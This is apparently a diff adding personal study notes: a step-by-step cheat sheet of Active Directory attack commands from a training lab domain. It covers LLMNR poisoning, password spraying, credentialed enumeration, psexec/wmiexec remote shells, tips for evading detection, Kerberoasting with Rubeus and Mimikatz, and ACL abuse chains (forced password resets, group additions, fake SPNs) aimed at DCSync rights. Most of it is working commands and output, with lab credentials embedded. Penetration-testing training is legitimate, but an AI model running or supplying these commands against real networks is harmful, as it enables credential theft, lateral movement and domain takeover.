@@ -1,0 +1,571 @@
+Identifying Hosts:
+tcpdump -i [interface name]
+responder -I [interface name] -A
+
+The above are alternative to WireShark
+
+Ping Sweep Across The Subnet:
+fping -asgq [172.16.5.0/23]
+
+Enumerate Discovered Hosts:
+nmap -v -A -iL [host list] -oN [output file]
+
+Identifying Users
+kerbrute userenum -d [domain name] --dc [dc ip] username.txt
+
+Password Spray
+# If you don't have valid domain credentials, use most popular passwords by country.
+kerbrute passwordspray -d [domain name] --dc [dc ip] users Welcome1 ****
+
+Link-Local Multicast Name Resolution (LLMNR) & NetBIOS Name Service (NBT-NS) Poisoning (LINXU)
+Find users and NTLM hash
+sudo responder -I ens224 
+
+We must run the tool with sudo privileges or as root and make sure the following ports are available on our attack host for it to function best: UDP 137, UDP 138, UDP 53, UDP/TCP 389,TCP 1433, UDP 1434, TCP 80, TCP 135, TCP 139, TCP 445, TCP 21, TCP 3141,TCP 25, TCP 110, TCP 587, TCP 3128, Multicast UDP 5355 and 5353
+
+Link-Local Multicast Name Resolution (LLMNR) & NetBIOS Name Service (NBT-NS) Poisoning (WINDOWS)
+PS C:\htb> Import-Module .\Inveigh.ps1
+PS C:\htb> (Get-Command Invoke-Inveigh).Parameters
+PS C:\htb> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
+
+Retrieving Password Policies
+# If you have valid domain credentials.
+crackmapexec smb [target ip] -u avazquez -p Password123 --pass-pol
+
+# RPCClient can be used also be used to connect to a DC using SMB NULL session to check password policy
+rpcclient -U "" -N [DC ip]
+rpcclient $> querydominfo
+
+<snip>
+min_password_length: 8
+<snip>
+
+# With enum4linux...
+enum4linux -P [DC ip]
+
+<SNIP>
+
+ ================================================== 
+|    Password Policy Information for 172.16.5.5    |
+ ================================================== 
+
+<SNIP>
+
+	[+] Minimum password length: 8
+
+<SNIP>
+
+# Establishing NULL session with Windows
+net use \\host\ipc$ "" /u:""
+
+C:\htb> net use \\DC01\ipc$ "" /u:""
+The command completed successfully.
+
+# Or try with username/password combination
+C:\htb> net use \\DC01\ipc$ "" /u:guest
+System error 1331 has occurred.
+
+# If we can authenticate to a domain from a Windows host then we can use net.exe
+# This would give us password policy overview
+C:\htb> net accounts
+
+# From PowerView
+PS C:\htb> import-module .\PowerView.ps1
+PS C:\htb> Get-DomainPolicy
+
+# Pulling user list
+enum4linux -U [DC ip]  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
+enum4linux -U [DC ip]  | grep "user"
+rpcclient -U "" -N [DC ip]
+crackmapexec smb [DC ip] --users
+./windapsearch.py --dc-ip [DC ip] -u "" -U
+kerbrute userenum -d inlanefreight.local --dc [DC ip] /opt/jsmith.txt
+
+# We can use crackmapexec with valid credentials too
+sudo crackmapexec smb [DC ip] -u htb-student -p Academy_student_AD! --users
+
+
+# Password Spray From Linux
+# Bash Script
+for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" [DC ip] | grep Authority; done
+
+# Kerbrute
+kerbrute passwordspray -d [domain name] --dc [DC ip] valid_users.txt  [password]
+
+#Crackmapexec
+sudo crackmapexec smb [DC ip] -u valid_users.txt -p [password] | grep +
+#Validate with Crackmapexec
+sudo crackmapexec smb [DC ip] -u [username] -p [password]
+
+
+# Password Spray From Windows
+PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
+PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
+
+# Enumerating Security Controls
+# Check the status of Defender
+PS C:\htb> Get-MpComputerStatus
+
+# Check AppLocker Policies
+PS C:\htb> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+
+# If PowerShell is disabled then try calling it from another location:
+# %SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe then call PS from %SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe or PowerShell_ISE.exe.
+
+#Enumerate PowerShell Language Mode (Full Language/Constrained Language)
+PS C:\htb> $ExecutionContext.SessionState.LanguageMode
+
+# Find LAPS (Local Administrator Password Solution) Delegated Group
+PS C:\htb> Find-LAPSDelegatedGroups
+
+# The Find-AdmPwdExtendedRights checks the rights on each computer with LAPS enabled for any groups with read access and users with "All Extended Rights, as the latter can read LAPS passwords and may be less protected than users in delegated groups.
+PS C:\htb> Find-AdmPwdExtendedRights
+
+# We can use the Get-LAPSComputers function to search for computers that have LAPS enabled when passwords expire, and even the randomized passwords in cleartext if our user has access.
+PS C:\htb> Get-LAPSComputers
+
+# Credentialed Enumeration - from Linux
+
+# Enumerate Domain Users
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
+
+# Enumerate Domain Groups
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
+
+# Enumerate Logged On Users
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --loggedon-users
+
+# Enumerate Shares - Domain Controllers
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
+
+# Use Spider_Plus module on Crackmapexec to dig files in each readable directory
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
+
+# Using SMBMap to enumerate SMB Shares
+smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
+
+# Using SMBMap to reursively list all directories
+smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
+
+# SMB NULL Session with rpcclient
+rpcclient -U "" -N 172.16.5.5
+rpcclient $> queryuser 0x457 (decimal value 1111 - RID part of the full user SID)
+rpcclient $> enumdomusers
+
+user:[administrator] rid:[0x1f4]
+user:[guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+<snip>
+
+IMPACKET TOOLKIT
+# Psexec.py
+psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125  
+
+One of the most useful tools in the Impacket suite is psexec.py. Psexec.py is a clone of the Sysinternals psexec executable, but works slightly differently from the original. The tool creates a remote service by uploading a randomly-named executable to the ADMIN$ share on the target host. It then registers the service via RPC and the Windows Service Control Manager. Once established, communication happens over a named pipe, providing an interactive remote shell as SYSTEM on the victim host. To connect to a host with psexec.py, we need credentials for a user with local administrator privileges.
+
+
+# wmiexec.py
+wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5  
+
+Wmiexec.py utilizes a semi-interactive shell where commands are executed through Windows Management Instrumentation. It does not drop any files or executables on the target host and generates fewer logs than other modules. After connecting, it runs as the local admin user we connected with (this can be less obvious to someone hunting for an intrusion than seeing SYSTEM executing many commands). This is a more stealthy approach to execution on hosts than other tools, but would still likely be caught by most modern anti-virus and EDR systems. We will use the same account as with psexec.py to access the host.
+
+
+# Windapsearch - Domain Admins
+python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
+
+We have several options with Windapsearch to perform standard enumeration (dumping users, computers, and groups) and more detailed enumeration. The --da (enumerate domain admins group members ) option and the -PU ( find privileged users) options. The -PU option is interesting because it will perform a recursive search for users with nested group membership.
+
+# Bloodhoud-Python
+sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
+
+# Credentialed Enumeration - from Windows
+
+# ActiveDirectory PowerShell Module
+PS C:\htb> Get-Module
+
+# Load ActiveDirectory Module
+PS C:\htb> Import-Module ActiveDirectory
+
+# Get Domain Info
+PS C:\htb> Get-ADDomain
+
+# Get-ADUser
+PS C:\htb> Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
+
+# Checking For Trust Relationships
+PS C:\htb> Get-ADTrust -Filter *
+
+# Group Enumeration
+PS C:\htb> Get-ADGroup -Filter * | select name
+
+# Detailed Group Info
+PS C:\htb> Get-ADGroup -Identity "Backup Operators"
+
+# Group Membership
+PS C:\htb> Get-ADGroupMember -Identity "Backup Operators"
+
+# Using PowerView
+
+# Domain User Information
+PS C:\htb>  Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
+
+# Recursive Group Membership
+PS C:\htb>  Get-DomainGroupMember -Identity "Domain Admins" -Recurse
+
+# Trust Enumeration
+PS C:\htb> Get-DomainTrustMapping
+
+# Testing for Local Admin Access
+PS C:\htb> Test-AdminAccess -ComputerName ACADEMY-EA-MS01
+
+# Finding Users With SPN Set
+PS C:\htb> Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
+
+# Using SharpView
+PS C:\htb> .\SharpView.exe Get-DomainUser -Help
+PS C:\htb> .\SharpView.exe Get-DomainUser -Identity forend
+
+# Using Sharphound
+PS C:\htb> .\SharpHound.exe -c All --zipfilename ILFREIGHT
+
+# Avoiding logs and Checking Defenses
+# Downgrading PowerShell
+PS C:\htb> powershell.exe -version 2
+
+# Firewall Checks
+PS C:\htb> netsh advfirewall show allprofiles
+
+# Windows Defender Check (from CMD.exe)
+C:\htb> sc query windefend
+
+# Check the status and configuration settings with the Get-MpComputerStatus cmdlet in PowerShell.
+PS C:\htb> Get-MpComputerStatus
+
+# Are you Alone - to see if anyone else is logged in to avoid detection
+PS C:\htb> qwinsta
+
+
+# Network Informaiton
+arp -a (Lists all known hosts stored in the arp table.)
+ipconfig /all (Prints out adapter settings for the host. We can figure out the network segment from here.)
+route print (Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host.)
+netsh advfirewall show state (Displays the status of the host's firewall. We can determine if it is active and filtering traffic.)
+
+
+# Dsquery
+All we need is elevated privileges on a host or the ability to run an instance of Command Prompt or PowerShell from a SYSTEM context. Below, we will show the basic search function with dsquery and a few helpful search filters.
+
+# User Search
+PS C:\htb> dsquery user
+
+# Computer Search
+PS C:\htb> dsquery computer
+
+# Wildcard Search
+PS C:\htb> dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
+
+# Users With Specific Attributes Set (PASSWD_NOTREQD)
+# Combining Dsquery with LDAP search filters, the below looks for users with the PASSWD_NOTREQD flag set in the userAccountControl attribut.
+PS C:\htb> dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
+
+# Searching for Domain Controllers
+PS C:\Users\forend.INLANEFREIGHT> dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
+
+
+UAC Values
+userAccountControl:1.2.840.113556.1.4.803: Specifies that we are looking at the User Account Control (UAC) attributes [https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties] for an object. This portion can change to include three different values we will explain below when searching for information in AD (also known as Object Identifiers (OIDs) [https://ldap.com/ldap-oid-reference-guide/].
+
+
+# Kerberoasting - from Linux
+# Depending on your position in a network, this attack can be performed in multiple ways:
+
+#    From a non-domain joined Linux host using valid domain user credentials.
+#    From a domain-joined Linux host as root after retrieving the keytab file.
+#    From a domain-joined Windows host authenticated as a domain user.
+#    From a domain-joined Windows host with a shell in the context of a domain account.
+#    As SYSTEM on a domain-joined Windows host.
+#    From a non-domain joined Windows host using runas /netonly.
+
+# Using Impacket
+# Listing SPN Accounts with GetUserSPNs.py
+Impacket-GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
+
+# Requesting all TGS Tickets
+Imoacket-GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 
+
+# Requesting a Single TGS ticket
+Impacket-GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
+
+# Kerberoasting - from Windows
+# Enumerating SPNs with setspn.exe
+C:\htb> setspn.exe -Q */*
+
+#Targeting a Single User
+PS C:\htb> Add-Type -AssemblyName System.IdentityModel
+PS C:\htb> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
+
+# Retrieving All Tickets Using setspn.exe
+PS C:\htb> setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
+
+# Extracting Tickets from Memory with Mimikatz
+Using 'mimikatz.log' for logfile : OK
+
+mimikatz # base64 /out:true
+isBase64InterceptInput  is false
+isBase64InterceptOutput is true
+
+mimikatz # kerberos::list /export  
+
+<SNIP>
+
+[00000002] - 0x00000017 - rc4_hmac_nt      
+   Start/End/MaxRenew: 2/24/2022 3:36:22 PM ; 2/25/2022 12:55:25 AM ; 3/3/2022 2:55:25 PM
+   Server Name       : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433 @ INLANEFREIGHT.LOCAL
+   Client Name       : htb-student @ INLANEFREIGHT.LOCAL
+   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ; 
+====================
+Base64 of file : 2-40a10000-htb-student@MSSQLSvc~DEV-PRE-SQL.inlanefreight.local~1433-INLANEFREIGHT.LOCAL.kirbi
+====================
+doIGPzCCBjugAwIBBaEDAgEWooIFKDCCBSRhggUgMIIFHKADAgEFoRUbE0lOTEFO
+RUZSRUlHSFQuTE9DQUyiOzA5oAMCAQKhMjAwGwhNU1NRTFN2YxskREVWLVBSRS1T
+<snip>
+
+muskypirate@htb[/htb]$ cat encoded_file | base64 -d > sqldev.kirbi
+muskypirate@htb[/htb]$ python2.7 kirbi2john.py sqldev.kirbi
+
+# Modifying crack file for Hashcat
+sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
+
+# Automated / Tool Based Route
+PS C:\htb> Import-Module .\PowerView.ps1
+PS C:\htb> Get-DomainUser * -spn | select samaccountname
+
+# Using PowerView to Target a Specific User
+PS C:\htb> Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
+
+# Exporting All Tickets to a CSV File
+PS C:\htb> Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
+
+# Using Rubeus
+PS C:\htb> .\Rubeus.exe
+
+# Using Rubeus '/stats' flag
+PS C:\htb> .\Rubeus.exe kerberoast /stats
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.0.2
+
+
+[*] Action: Kerberoasting
+
+[*] Listing statistics about target users, no ticket requests being performed.
+[*] Target Domain          : INLANEFREIGHT.LOCAL
+[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'
+
+[*] Total kerberoastable users : 9
+
+
+ ------------------------------------------------------------
+ | Supported Encryption Type                        | Count |
+ ------------------------------------------------------------
+ | RC4_HMAC_DEFAULT                                 | 7     |
+ | AES128_CTS_HMAC_SHA1_96, AES256_CTS_HMAC_SHA1_96 | 2     |
+ ------------------------------------------------------------
+
+ ----------------------------------
+ | Password Last Set Year | Count |
+ ----------------------------------
+ | 2022                   | 9     |
+ ----------------------------------
+
+# Using the /nowrap Flag
+PS C:\htb> .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
+PS C:\htb> .\Rubeus.exe kerberoast /user:testspn /nowrap
+
+Accounts with the 'admincount' attribute set to 1 would likely be high-value targets and worth our initial focus for offline cracking efforts with Hashcat.
+
+# PowerView
+PS C:\htb> Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
+# [https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/decrypting-the-selection-of-supported-kerberos-encryption-types/ba-p/1628797]
+
+# We can use Rubeus with the /tgtdeleg flag to specify that we want only RC4 encryption when requesting a new service ticket. This may be a failsafe built-in to Active Directory for backward compatibility. The tool requested an RC4 ticket even though the supported encryption types are listed as AES 128/256.
+PS C:\htb> .\Rubeus.exe kerberoast /tgtdeleg /user:testspn /nowrap
+
+# Access Control List (ACL) Abuse Primer
+
+# ForceChangePassword - gives us the right to reset a user's password without first knowing their password.
+# GenericWrite - gives us the right to write to any non-protected attribute on an object. If we have this access over a user, we could assign them an SPN and perform a Kerberoasting attack (which relies on the target account having a weak password set). Over a group means we could add ourselves or another security principal to a given group. Finally, if we have this access over a computer object, we could perform a resource-based constrained delegation attack.
+# AddSelf - shows security groups that a user can add themselves to.
+# GenericAll - this grants us full control over a target object. Again, depending on if this is granted over a user or group, we could modify group membership, force change a password, or perform a targeted Kerberoasting attack. If we have this access over a computer object and the Local Administrator Password Solution (LAPS) is in use in the environment, we can read the LAPS password and gain local admin access to the machine which may aid us in lateral movement or privilege escalation in the domain if we can obtain privileged controls or gain some sort of privileged access.
+
+# Enumerating ACLs with PowerView
+PS C:\htb> Find-InterestingDomainAcl
+
+# But this would give you data too huge to sift through in time
+# Instead it is better to focus on one user
+
+PS C:\htb> Import-Module .\PowerView.ps1
+PS C:\htb> $sid = Convert-NameToSid wley
+PS C:\htb> Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
+
+ObjectDN               : CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114-1176
+ActiveDirectoryRights  : ExtendedRight
+ObjectAceFlags         : ObjectAceTypePresent
+ObjectAceType          : 00299570-246d-11d0-a768-00aa006e0529
+<snip>
+
+# Use ResolveGUIDs flag with PowerView to resolve the GUID value to its name
+
+PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 
+
+ObjectDN               : CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114-1176
+ActiveDirectoryRights  : ExtendedRight
+ObjectAceFlags         : ObjectAceTypePresent
+ObjectAceType          : User-Force-Change-Password
+<snip>
+
+# However the long route to resolving GUID value to its name is using PowerShell (in case the tool fails)
+
+PS C:\htb> $guid= "00299570-246d-11d0-a768-00aa006e0529"
+PS C:\htb> Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl
+
+Name              : User-Force-Change-Password
+DisplayName       : Reset Password
+DistinguishedName : CN=User-Force-Change-Password,CN=Extended-Rights,CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL
+rightsGuid        : 00299570-246d-11d0-a768-00aa006e0529
+
+# Further enumeration
+
+PS C:\htb> $sid2 = Convert-NameToSid damundsen
+PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose
+
+AceType               : AccessAllowed
+ObjectDN              : CN=Help Desk Level 1,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+ActiveDirectoryRights : ListChildren, ReadProperty, GenericWrite
+OpaqueLength          : 0
+<snip>
+
+# GenericWrite allows user to add another user (in this case to Help Desk)
+# So user Wley ---User-Force-Change-Password---> user Damundsen ---GenericWrite---> Help Desk Level 1
+
+PS C:\htb> Get-DomainGroup -Identity "Help Desk Level 1" | select memberof
+
+memberof                                                                      
+--------                                                                      
+CN=Information Technology,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+
+# Enumerate the rights of the Information Technology group
+
+PS C:\htb> $itgroupsid = Convert-NameToSid "Information Technology"
+PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose
+
+AceType               : AccessAllowed
+ObjectDN              : CN=Angela Dunn,OU=Server Admin,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+ActiveDirectoryRights : GenericAll
+OpaqueLength          : 0
+<snip>
+
+# Has GenericAll rights over user Angela Dunn
+
+PS C:\htb> $adunnsid = Convert-NameToSid adunn 
+PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $adunnsid} -Verbose
+
+AceQualifier           : AccessAllowed
+ObjectDN               : DC=INLANEFREIGHT,DC=LOCAL
+ActiveDirectoryRights  : ExtendedRight
+ObjectAceType          : DS-Replication-Get-Changes-In-Filtered-Set
+ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114
+<snip>
+
+AceQualifier           : AccessAllowed
+ObjectDN               : DC=INLANEFREIGHT,DC=LOCAL
+ActiveDirectoryRights  : ExtendedRight
+ObjectAceType          : DS-Replication-Get-Changes
+<snip>
+
+# DS-Replication-Get-Changes and DS-Replication-Get-Changes-In-Filtered-Set rights over the domain object means that this user can be leveraged to perform a DCSync attack.
+
+# ACL Abuse Tactics
+# Creating a PSCredential Object
+PS C:\htb> $SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
+PS C:\htb> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword) 
+
+# Creating a SecureString Object
+PS C:\htb> $damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
+
+# The same can be done for linux with tools such as pth-net, which is part of the [https://github.com/byt3bl33d3r/pth-toolkit].
+
+# Changing the User's Password
+PS C:\htb> cd C:\Tools\
+PS C:\htb> Import-Module .\PowerView.ps1
+PS C:\htb> Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
+
+PS C:\htb> $SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
+PS C:\htb> $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword) 
+
+# Adding damundsen to the Help Desk Level 1 Group
+PS C:\htb> Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members
+PS C:\htb> Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
+PS C:\htb> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
+
+# The last command above is to check the amendment
+
+# Creating a Fake SPN
+# On Linux it can be done using targetedKerberoast tool [https://github.com/ShutdownRepo/targetedKerberoast]. It will create a temporary SPN, retrieve the hash, and delete the temporary SPN all in one command
+PS C:\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
+
+# Then use Rubeus to Kerberoast
+PS C:\htb> .\Rubeus.exe kerberoast /user:adunn /nowrap
+
+# Removing the Fake SPN from adunn's Account
+PS C:\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
+
+# Removing damundsen from the Help Desk Level 1 Group
+PS C:\htb> Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
+
+# Confirming damundsen was Removed from the Group
+PS C:\htb> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose
+
+# Converting the SDDL String into a Readable Format
+PS C:\htb> ConvertFrom-SddlString "O:BAG:BAD:AI(D;;DC;;;WD)<snip>(AU;SA;CR;;;BA)(AU;SA;WPWDWO;;;WD)" 
+
+# Filter DiscretionaryAcl to see modifications inticative of an attack
+PS C:\htb> ConvertFrom-SddlString "O:BAG:BAD:AI(D;;DC;;;WD)<snip>(AU;SA;CR;;;BA)(AU;SA;WPWDWO;;;WD)" | select -ExpandProperty DiscretionaryAcl
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
